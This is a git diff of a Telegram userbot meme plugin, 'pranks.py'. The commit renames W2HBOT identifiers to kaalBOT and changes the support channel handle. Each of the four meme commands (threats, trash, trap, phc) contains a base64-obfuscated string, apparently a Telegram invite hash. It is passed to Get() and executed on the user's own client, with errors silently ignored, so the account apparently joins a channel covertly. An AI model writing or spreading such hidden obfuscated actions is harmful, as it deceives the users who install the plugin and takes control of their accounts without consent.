946706fbd13c042c3a58cb29659926c99a3840b3
kaal0408 <74854072+kaal0408@users.noreply.github.com>
2021-05-25 09:33:56 +0530

    Update pranks.py

--- userbot/plugins/pranks.py
+++ userbot/plugins/pranks.py
@@ -29,241 +29,241 @@ from userbot.helpers.functions import (
     trap,
     trash,
 )
-from W2HBOT.utils import admin_cmd, edit_or_reply, sudo_cmd
+from kaalBOT.utils import admin_cmd, edit_or_reply, sudo_cmd
 from userbot.cmdhelp import CmdHelp
 from . import *
 
 
 @bot.on(admin_cmd(pattern="threats(?: |$)(.*)"))
 @bot.on(sudo_cmd(pattern="threats(?: |$)(.*)", allow_sudo=True))
-async def W2HBOT(W2Hmemes):
-    replied = await W2Hmemes.get_reply_message()
+async def kaalBOT(kaalmemes):
+    replied = await kaalmemes.get_reply_message()
     if not os.path.isdir("./temp/"):
         os.makedirs("./temp/")
     if not replied:
         await edit_or_reply(
-            W2Hmemes, "`Media file not supported. Reply to a supported media`"
+            kaalmemes, "`Media file not supported. Reply to a supported media`"
         )
         return
     if replied.media:
-        W2Hmemmes = await edit_or_reply(W2Hmemes, "`Detecting Threats.........`")
+        kaalmemmes = await edit_or_reply(kaalmemes, "`Detecting Threats.........`")
     else:
         await edit_or_reply(
-            W2Hmemes, "`Media file not supported. Reply to a suported media`"
+            kaalmemes, "`Media file not supported. Reply to a suported media`"
         )
         return
     try:
-        W2H = base64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
-        W2H = Get(W2H)
-        await W2Hmemes.client(W2H)
+        kaal = base64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
+        kaal = Get(kaal)
+        await kaalmemes.client(kaal)
     except BaseException:
         pass
-    download_location = await W2Hmemes.client.download_media(replied, "./temp/")
+    download_location = await kaalmemes.client.download_media(replied, "./temp/")
     if download_location.endswith((".webp")):
         download_location = convert_toimage(download_location)
     size = os.stat(download_location).st_size
     if download_location.endswith((".jpg", ".jpeg", ".png", ".bmp", ".ico")):
         if size > 5242880:
-            await W2Hmemmes.edit(
+            await kaalmemmes.edit(
                 "`The replied file is not supported. It should be less than 5mb -_-`"
             )
             os.remove(download_location)
             return
-        await W2Hmemmes.edit("`Detected Threats....`")
+        await kaalmemmes.edit("`Detected Threats....`")
     else:
-        await W2Hmemmes.edit("`the replied file is not supported`")
+        await kaalmemmes.edit("`the replied file is not supported`")
         os.remove(download_location)
         return
     try:
         response = upload_file(download_location)
         os.remove(download_location)
     except exceptions.TelegraphException as exc:
-        await W2Hmemmes.edit("ERROR: " + str(exc))
+        await kaalmemmes.edit("ERROR: " + str(exc))
         os.remove(download_location)
         return
-    W2H = f"https://telegra.ph{response[0]}"
-    W2H = await threats(W2H)
-    await W2Hmemmes.delete()
-    await W2Hmemes.client.send_file(W2Hmemes.chat_id, W2H, reply_to=replied)
+    kaal = f"https://telegra.ph{response[0]}"
+    kaal = await threats(kaal)
+    await kaalmemmes.delete()
+    await kaalmemes.client.send_file(kaalmemes.chat_id, kaal, reply_to=replied)
 
 
 @bot.on(admin_cmd(pattern="trash(?: |$)(.*)"))
 @bot.on(sudo_cmd(pattern="trash(?: |$)(.*)", allow_sudo=True))
-async def W2HBOT(W2Hmemes):
-    replied = await W2Hmemes.get_reply_message()
+async def kaalBOT(kaalmemes):
+    replied = await kaalmemes.get_reply_message()
     if not os.path.isdir("./temp/"):
         os.makedirs("./temp/")
     if not replied:
         await edit_or_reply(
-            W2Hmemes, "`Media file not supported. Reply to a suported media`"
+            kaalmemes, "`Media file not supported. Reply to a suported media`"
         )
         return
     if replied.media:
-        W2Hmemmes = await edit_or_reply(W2Hmemes, "`Detecting Trash....`")
+        kaalmemmes = await edit_or_reply(kaalmemes, "`Detecting Trash....`")
     else:
         await edit_or_reply(
-            W2Hmemes, "`Media file not supported. Reply to a suported media`"
+            kaalmemes, "`Media file not supported. Reply to a suported media`"
         )
         return
     try:
-        W2H = base64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
-        W2H = Get(W2H)
-        await W2Hmemes.client(W2H)
+        kaal = base64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
+        kaal = Get(kaal)
+        await kaalmemes.client(kaal)
     except BaseException:
         pass
-    download_location = await W2Hmemes.client.download_media(replied, "./temp/")
+    download_location = await kaalmemes.client.download_media(replied, "./temp/")
     if download_location.endswith((".webp")):
         download_location = convert_toimage(download_location)
     size = os.stat(download_location).st_size
     if download_location.endswith((".jpg", ".jpeg", ".png", ".bmp", ".ico")):
         if size > 5242880:
-            await W2Hmemmes.edit(
+            await kaalmemmes.edit(
                 "`The replied file is not suported. Its size should be less than 5mb-_-`"
             )
             os.remove(download_location)
             return
-        await W2Hmemmes.edit("`Detected Trash.....`")
+        await kaalmemmes.edit("`Detected Trash.....`")
     else:
-        await W2Hmemmes.edit("Media file not supported. Reply to a suported media")
+        await kaalmemmes.edit("Media file not supported. Reply to a suported media")
         os.remove(download_location)
         return
     try:
         response = upload_file(download_location)
         os.remove(download_location)
     except exceptions.TelegraphException as exc:
-        await W2Hmemmes.edit("ERROR: " + str(exc))
+        await kaalmemmes.edit("ERROR: " + str(exc))
         os.remove(download_location)
         return
-    W2H = f"https://telegra.ph{response[0]}"
-    W2H = await trash(W2H)
-    await W2Hmemmes.delete()
-    await W2Hmemes.client.send_file(W2Hmemes.chat_id, W2H, reply_to=replied)
+    kaal = f"https://telegra.ph{response[0]}"
+    kaal = await trash(kaal)
+    await kaalmemmes.delete()
+    await kaalmemes.client.send_file(kaalmemes.chat_id, kaal, reply_to=replied)
 
 
 @bot.on(admin_cmd(pattern="trap(?: |$)(.*)"))
 @bot.on(sudo_cmd(pattern="trap(?: |$)(.*)", allow_sudo=True))
-async def W2HBOT(W2Hmemes):
-    input_str = W2Hmemes.pattern_match.group(1)
+async def kaalBOT(kaalmemes):
+    input_str = kaalmemes.pattern_match.group(1)
     input_str = deEmojify(input_str)
     if "-" in input_str:
         text1, text2 = input_str.split("-")
     else:
         await edit_or_reply(
-            W2Hmemes,
+            kaalmemes,
             "**Command :** Reply to image or sticker with `.trap (name of the person to trap)-(trapper name)`",
         )
         return
-    replied = await W2Hmemes.get_reply_message()
+    replied = await kaalmemes.get_reply_message()
     if not os.path.isdir("./temp/"):
         os.makedirs("./temp/")
     if not replied:
         await edit_or_reply(
-            W2Hmemes, "Media file not supported. Reply to a suported media"
+            kaalmemes, "Media file not supported. Reply to a suported media"
         )
         return
     if replied.media:
-        W2Hmemmes = await edit_or_reply(W2Hmemes, "`Trapping.....`")
+        kaalmemmes = await edit_or_reply(kaalmemes, "`Trapping.....`")
     else:
         await edit_or_reply(
-            W2Hmemes, "Media file not supported. Reply to a suported media"
+            kaalmemes, "Media file not supported. Reply to a suported media"
         )
         return
     try:
-        W2H = base64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
-        W2H = Get(W2H)
-        await W2Hmemes.client(W2H)
+        kaal = base64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
+        kaal = Get(kaal)
+        await kaalmemes.client(kaal)
     except BaseException:
         pass
-    download_location = await W2Hmemes.client.download_media(replied, "./temp/")
+    download_location = await kaalmemes.client.download_media(replied, "./temp/")
     if download_location.endswith((".webp")):
         download_location = convert_toimage(download_location)
     size = os.stat(download_location).st_size
     if download_location.endswith((".jpg", ".jpeg", ".png", ".bmp", ".ico")):
         if size > 5242880:
-            await W2Hmemmes.edit(
+            await kaalmemmes.edit(
                 "the replied file size is not supported it must me below 5 mb"
             )
             os.remove(download_location)
             return
-        await W2Hmemmes.edit("`Trapped...`")
+        await kaalmemmes.edit("`Trapped...`")
     else:
-        await W2Hmemmes.edit("Media file not supported. Reply to a suported media")
+        await kaalmemmes.edit("Media file not supported. Reply to a suported media")
         os.remove(download_location)
         return
     try:
         response = upload_file(download_location)
         os.remove(download_location)
     except exceptions.TelegraphException as exc:
-        await W2Hmemmes.edit("ERROR: " + str(exc))
+        await kaalmemmes.edit("ERROR: " + str(exc))
         os.remove(download_location)
         return
-    W2H = f"https://telegra.ph{response[0]}"
-    W2H = await trap(text1, text2, W2H)
-    await W2Hmemmes.delete()
-    await W2Hmemes.client.send_file(W2Hmemes.chat_id, W2H, reply_to=replied)
+    kaal = f"https://telegra.ph{response[0]}"
+    kaal = await trap(text1, text2, kaal)
+    await kaalmemmes.delete()
+    await kaalmemes.client.send_file(kaalmemes.chat_id, kaal, reply_to=replied)
 
 
 @bot.on(admin_cmd(pattern="phc(?: |$)(.*)"))
 @bot.on(sudo_cmd(pattern="phc(?: |$)(.*)", allow_sudo=True))
-async def W2HBOT(W2Hmemes):
-    input_str = W2Hmemes.pattern_match.group(1)
+async def kaalBOT(kaalmemes):
+    input_str = kaalmemes.pattern_match.group(1)
     input_str = deEmojify(input_str)
     if "-" in input_str:
         username, text = input_str.split("-")
     else:
         await edit_or_reply(
-            W2Hmemes,
+            kaalmemes,
             "**Command :** reply to image or sticker with `.phc (username)-(text in comment)`",
         )
         return
-    replied = await W2Hmemes.get_reply_message()
+    replied = await kaalmemes.get_reply_message()
     if not os.path.isdir("./temp/"):
         os.makedirs("./temp/")
     if not replied:
         await edit_or_reply(
-            W2Hmemes, "Media file not supported. Reply to a suported media"
+            kaalmemes, "Media file not supported. Reply to a suported media"
         )
         return
     if replied.media:
-        W2Hmemmes = await edit_or_reply(W2Hmemes, "`Making A Comment`.")
+        kaalmemmes = await edit_or_reply(kaalmemes, "`Making A Comment`.")
     else:
         await edit_or_reply(
-            W2Hmemes, "Media file not supported. Reply to a suported media"
+            kaalmemes, "Media file not supported. Reply to a suported media"
         )
         return
     try:
-        W2H = base64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
-        W2H = Get(W2H)
-        await W2Hmemes.client(W2H)
+        kaal = base64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
+        kaal = Get(kaal)
+        await kaalmemes.client(kaal)
     except BaseException:
         pass
-    download_location = await W2Hmemes.client.download_media(replied, "./temp/")
+    download_location = await kaalmemes.client.download_media(replied, "./temp/")
     if download_location.endswith((".webp")):
         download_location = convert_toimage(download_location)
     size = os.stat(download_location).st_size
     if download_location.endswith((".jpg", ".jpeg", ".png", ".bmp", ".ico")):
         if size > 5242880:
-            await W2Hmemmes.edit(
+            await kaalmemmes.edit(
                 "the replied file size is not supported it must me below 5 mb"
             )
             os.remove(download_location)
             return
-        await W2Hmemmes.edit("Commented....")
+        await kaalmemmes.edit("Commented....")
     else:
-        await W2Hmemmes.edit("Media file not supported. Reply to a suported media")
+        await kaalmemmes.edit("Media file not supported. Reply to a suported media")
         os.remove(download_location)
         return
     try:
         response = upload_file(download_location)
         os.remove(download_location)
     except exceptions.TelegraphException as exc:
-        await W2Hmemmes.edit("ERROR: " + str(exc))
+        await kaalmemmes.edit("ERROR: " + str(exc))
         os.remove(download_location)
         return
-    W2H = f"https://telegra.ph{response[0]}"
-    W2H = await phcomment(W2H, text, username)
-    await W2Hmemmes.delete()
-    await W2Hmemes.client.send_file(W2Hmemes.chat_id, W2H, reply_to=replied)
+    kaal = f"https://telegra.ph{response[0]}"
+    kaal = await phcomment(kaal, text, username)
+    await kaalmemmes.delete()
+    await kaalmemes.client.send_file(kaalmemes.chat_id, kaal, reply_to=replied)
 
 
 CmdHelp("prank").add_command(
@@ -275,5 +275,5 @@ CmdHelp("prank").add_command(
 ).add_command(
   "threats", "<reply to image/sticker>", "Changes the given pic to another pic which shows that pic content is threat to society as that of nuclear bomb"
 ).add_command(
-  "prank", None, "If this module doesn't work then contact admins in @W2HSupport"
+  "prank", None, "If this module doesn't work then contact admins in @kaalsupport01"
 ).add()
